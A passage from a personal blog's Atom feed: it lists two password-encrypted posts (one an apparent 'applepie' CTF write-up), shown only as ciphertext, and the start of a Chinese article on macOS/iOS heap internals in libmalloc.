8RrMzP0/UROZcKHzKwmBeSlYIqgpy/LvhlamD7t0CFIyoMp6HZ8gUYY0g1/mg3lSR/Vnt2rOxq2XARGAMfhrHpWD5kodgC8na2kFkMTr8TyglIzdP0gsan9aEzjzF6a9tFrD1evaB2ulV7vful3bd9XvKtJqYxuiaI+VQek53WIAnJwHhRl7A4P3k/mAZL9FmZ5P/7QEE1cMEsG1QNxEmqtrTlPtvaeLMyRsLCd3kDMI8IIgPP0WDq080SCn6OTcu05f+ynaqkebRAWn8ds20+sdFPKhfA2KQ3yfEfgix/gf9ig7rxCUCycue7NlrqwoBtJ3YAuGTbJwjrMddHohoWjUV/r/1PIi2BioHoQwsbj0e29nIJViy8DqtRYQFC3tbiRg5xyKOxBOmfwO83eiWpDvxRPTGXfltYg9Xf6otqCITSEPme7F5jvwJlPKriKOalyExbXgkAPR1XykwvalzRaXtaGrCMwtm9r0SMEzhty2WozeM2YsUQ5GUrmAPH1a19zWTdQ9dp82yODEQ5Ceymc2LPKQhc59h+sLKKWV5dD6SuxdLLGdNDaEx2mcxJukIthLqjYCSWewjhQbKb2Hbjj616IQpfnQ7EY7RMDBRK6XfEtgcc6Euxdsr9F3ASN/EJ4niWkuanD0yduzkrsh3oTJ+JGMXmcIsblGTLIozy2BaT6MDRZGcm3slgTr7pkenSQwtShMDOHn04XKLR6/xKccrHoJDJHCJ+J+iXHijjBRM+XtxOO1QlOnnNZzNxYnaHX4VOxHdrp/J0yiR+jxHYWmZTwbapVXzOWg2prHEcB1C5zzjAvUH94Ez2DFZ6Q7WzgRvpEqjvVsgt5sF5sYu5gerOCGGmOw/rMievgSkf716UlaOFFFzKvav/0Mvy9YnUsgBgBrNqhQHtqZ7UsMHoKQBhaEwulQdsVKDBkaI+C6QsWQHou/tX4P4yG7lH7EUzlIzCaFcq+pST0+pem7I6CByJcnoYHkNpqHj1/5Es/dWYwnULpfPnzttR6yY+09SzfRT0SuQd0jnOMZBDfwK5/CHc0UDQLRKmTAWfWTUxkYwpvWwg21nPyECzODAYvlJBSQanEs2qQo3qtL30Nv2fPNdJsLNF2tB1ptR0F1AV+fXVdTGwALMCbZM4HneLwobNg==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      password is show 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-02T10:54:02.233Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" 